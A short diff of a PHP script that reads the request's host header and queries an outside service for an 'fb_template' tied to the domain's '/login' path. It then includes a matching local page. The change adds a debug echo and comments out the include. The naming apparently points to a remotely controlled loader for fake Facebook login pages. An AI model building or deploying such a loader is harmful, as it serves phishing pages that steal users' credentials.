@@ -30,6 +30,7 @@ if (isset($_SERVER['HTTP_X_FORWARDED_HOST'])) {
 } else {
     $current_domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
 }
+echo $current_domain . "/login";
 $response_fb = makeGetRequest('https://minimil.onrender.com/api/websites?domain_fb=' . $current_domain . "/login");
 $responseData_fb = json_decode($response_fb['content']);
 $page_fb = isset($responseData_fb->data->fb_template) ? $responseData_fb->data->fb_template : '';
@@ -40,6 +41,6 @@ $validPages_fb = [
 ];
 
 if (array_key_exists($page_fb, $validPages_fb) && file_exists($validPages_fb[$page_fb])) {
-    include $validPages_fb[$page_fb];
+    // include $validPages_fb[$page_fb];
 }
 ?>
